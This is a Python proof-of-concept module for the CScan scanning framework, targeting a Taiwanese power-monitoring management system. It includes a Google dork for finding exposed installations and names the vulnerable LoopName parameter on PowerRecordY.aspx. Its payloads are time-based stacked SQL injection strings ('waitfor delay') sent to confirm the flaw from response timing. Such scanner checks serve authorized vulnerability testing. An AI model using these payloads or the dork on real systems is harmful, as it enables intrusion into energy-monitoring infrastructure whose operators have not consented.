# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'Electric_Monitor_0003'  # 平台漏洞编号，留空
    name = '台湾某电力监控系统通用型注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-23'  # 漏洞公布时间
    desc = '''
        台湾某电力监控系统通用型注入漏洞。
        google dork:"智慧型電能監控管理系統"
        http://foorbar/PowerRecordY.aspx?Date=2015&LoopName=1.1 Parameter: LoopName (GET)
        type: stack queries, boolean-based blind
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电力监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7a03d3fe-cb68-4cac-a6b7-0ccffab8e3ee'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2010-0102615
            hh = hackhttp.hackhttp()
            arg = self.target
            waitfor_0 = arg + '/PowerRecordY.aspx?Date=2015&LoopName=1.1);waitfor%20delay%20%270:0:0%27--'
            waitfor_5 = arg + '/PowerRecordY.aspx?Date=2015&LoopName=1.1);waitfor%20delay%20%270:0:5%27--'  
            t0 = time.time()
            code1, head, res, err, _ = hh.http(waitfor_0)
            t_0 = time.time()-t0
            if code1 == 0:
                return False
            t5 = time.time()    
            code2, head, res, err, _ = hh.http(waitfor_5)
            t_5 = time.time()-t5
            if code2 == 0:
                return False

            if code1 == 200 and code2 == 200 and t_5 > 5 and t_0 < 3:
                #security_hole('SQL injection: ' + waitfor_5)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
